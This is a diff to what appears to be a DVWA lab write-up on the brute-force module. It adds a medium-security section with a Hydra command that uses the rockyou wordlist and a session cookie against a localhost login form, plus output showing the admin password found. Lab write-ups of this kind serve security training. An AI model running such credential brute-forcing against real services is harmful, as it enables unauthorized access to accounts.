@@ -49,7 +49,7 @@ So let’s use hydra for brute force:
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
 ```
 
-Here we are using cookies because if we are not authenticated when we make the login attempts, we will be redirected to default login page
+Here we are using cookies because if we are not authenticated when we make the login attempts, we will be redirected to default login page.
 
 <!-- {::options parse_block_html="true" /}  -->
 
@@ -82,6 +82,34 @@ Login credentials found by hydra:
 **Security level is currently: medium.**
 
 
+It is still using get request.
+
+so lets use hydra again:
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
+```
+it still work but this time attack takes significantly longer then before.
+
+on analyzing the login functionality we notice that the response is delayed by 2 or 3 seconds on wrong attempt.
+
+<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
+  
+```Shell
+┌─[aftab@parrot]─[~/Downloads/dvwa]
+└──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-18 09:17:45
+[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-get-form://127.0.0.1:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium
+[80][http-get-form] host: 127.0.0.1   login: admin   password: password
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-18 09:18:50
+
+```
+  
+</details>
 
 ---
 
